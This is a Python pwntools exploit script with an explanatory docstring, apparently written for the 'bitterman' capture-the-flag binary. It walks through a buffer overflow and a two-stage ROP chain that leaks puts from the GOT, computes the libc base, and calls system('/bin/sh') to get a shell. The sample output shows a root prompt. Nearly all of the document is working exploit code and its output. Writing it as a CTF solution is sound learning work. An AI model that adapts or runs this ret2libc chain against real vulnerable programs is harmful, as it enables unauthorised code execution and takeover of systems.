#!/usr/bin/env python


from pwn import *

"""
> What's your name? 
stunn4
Hi, stunn4

> Please input the length of your message: 
1024
> Please enter your text: 
ABCD
> Thanks!

To pwn this binary I used a memory leakage technique that allowed me to leak the address of puts to calculate offset
and then I executed system to open a shell.

gdb-peda$ checksec
	CANARY    : disabled
	FORTIFY   : disabled
	NX        : ENABLED
	PIE       : disabled
	RELRO     : disabled

gdb-peda$ info functions
	All defined functions:

	File main.c:
	13:	int main(int, char **);
	6:	int read_nbytes(char *, size_t);

	Non-debugging symbols:
	0x00000000004004f0  _init
	0x0000000000400520  puts@plt
	0x0000000000400530  printf@plt
	0x0000000000400540  read@plt
	0x0000000000400550  __libc_start_main@plt
	0x0000000000400560  __gmon_start__@plt
	0x0000000000400570  fflush@plt
	0x0000000000400580  __isoc99_scanf@plt
	0x0000000000400590  _start
	0x00000000004005c0  deregister_tm_clones
	0x0000000000400600  register_tm_clones
	0x0000000000400640  __do_global_dtors_aux
	0x0000000000400660  frame_dummy
	0x00000000004007f0  __libc_csu_init
	0x0000000000400860  __libc_csu_fini
	0x0000000000400864  _fini

First stage:
    We have to leak a got entry address by calling puts@plt.
    I chose to print to terminal puts@got.
What we need?
    1. a pop rdi gadget since we are calling function using a x64 linux system
    2. the puts@got address
    3. the puts@plt address
    4. the main address to avoid program crashing

1. ROPgadget --binary bitterman | grep 'pop rdi ; ret'
    0x0000000000400853 : pop rdi ; ret

2. objdump -j .plt -d bitterman | grep puts
    0000000000400520 <puts@plt>:
	400520:	ff 25 2a 07 20 00    	jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>

3. you can see above I used gdb -> info functions to read symbols

4. I saw the main address when I executed the program through gdb

So we are ready to execute our first stage and leak the puts address to calculate offset.
	To do this last step we need the address of puts into libc:
	readelf -s libc.so.6 | grep puts
	   194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
	   426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5 # This!!
	   501: 00000000000fefe0  1241 FUNC    GLOBAL DEFAULT   14 putspent@@GLIBC_2.2.5
	   685: 0000000000100ae0   697 FUNC    GLOBAL DEFAULT   14 putsgent@@GLIBC_2.10
	  1154: 0000000000072af0   338 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
	  1698: 0000000000072af0   338 FUNC    GLOBAL DEFAULT   14 _IO_fputs@@GLIBC_2.2.5
	  2336: 000000000007cd00   151 FUNC    WEAK   DEFAULT   14 fputs_unlocked@@GLIBC_2.2.5
	then:
	  offset = (leaked_puts - libc_puts)

So we can use this offset to exploit functions from libc by adding this offset to the functions address into libc.

1. shell address
strings -a -t x libc.so.6 | grep /bin/sh
    183cee /bin/sh
2. system address
readelf -s libc.so.6 | grep system
    235: 0000000000129d20    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5
    613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE
    1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5

./exploit.py 
	[+] Starting local process './bitterman': pid 11075
	[+] leaked puts: 0x7fba59314040
	[*] Switching to interactive mode

	$ whoami
	root
	$

"""

PROGRAM_NAME = "./bitterman"

#p = gdb.debug(PROGRAM_NAME, "b main")
p = process(PROGRAM_NAME)





rdi_gadget = p64(0x400853) # pop rdi ; ret
puts_got = p64(0x600c50)
puts_plt = p64(0x400520)
main = p64(0x4006ec)


junk = "A" * 152


buf = ""
buf += junk
buf += rdi_gadget
buf += puts_got
buf += puts_plt
buf += main


p.sendlineafter("name?", "stunn4")
p.recvline()
p.sendlineafter("message:", "1024")
p.recvline()
p.sendlineafter("text:", buf)
p.recvline()
p.recvuntil("Thanks!")

libc_puts = 0x74040
leaked_puts = p.recv()
leaked_puts = u64(leaked_puts[:8].strip().ljust(8, "\x00"))
offset = (leaked_puts - libc_puts)

log.success("leaked puts: " + hex(leaked_puts))

bin_sh = p64(0x183cee + offset)
libc_system = p64(0x46ff0 + offset)

buf = ""
buf += junk
buf += rdi_gadget
buf += bin_sh
buf += libc_system


p.sendline("stunn4")
p.recvline()
p.sendlineafter("message:", "1024")
p.recvline()
p.sendlineafter('text:', buf)
p.recvline()
p.recvuntil("Thanks!")



p.interactive()